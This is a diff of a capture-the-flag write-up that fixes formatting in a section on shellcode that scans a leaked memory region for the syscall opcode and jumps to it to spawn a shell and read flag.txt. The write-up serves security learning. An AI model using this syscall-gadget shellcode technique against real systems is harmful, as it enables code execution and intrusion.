@@ -130,14 +130,14 @@ The first part is easy, let's take the first leak and put it into a register:
 mov r8, [rbp - 0x218]
 ```
 
-We could zero out the 12 least significant bits of this leak to align the address to the start of a memory page, but in our case, it's unnecessary, we already know there are 5 syscall instructions diseminated in the region and it is impossible that they are all contained in the first '0x340' bits of the page.
+We could zero out the 12 least significant bits of this leak to align the address to the start of a memory page, but in our case, it's unnecessary, we already know there are 5 syscall instructions diseminated in the region and it is impossible that they are all contained in the first `0x340` bits of the page.
 Now let's scan the memory region for a syscall instruction, remember that it's opcode is `0x0F05` but we are in little-endian so we need to reverse the order of bits:
 
 ```asm
 loop:
 inc r8
 mov ax, word ptr [r8]
-cmp ax, 0x050f <-- syscall opcode but reversed
+cmp ax, 0x050f // <-- syscall opcode but reversed
 jne loop
 ```
 
@@ -155,5 +155,5 @@ xor rdx, rdx
 jmp r8 // <-- jump to syscall outside our mmap area
 ```
 
-sending this payload will spawn a shell and with a simple 'cat flag.txt' we get the flag!
+sending this payload will spawn a shell and with a simple `cat flag.txt` we get the flag!
 
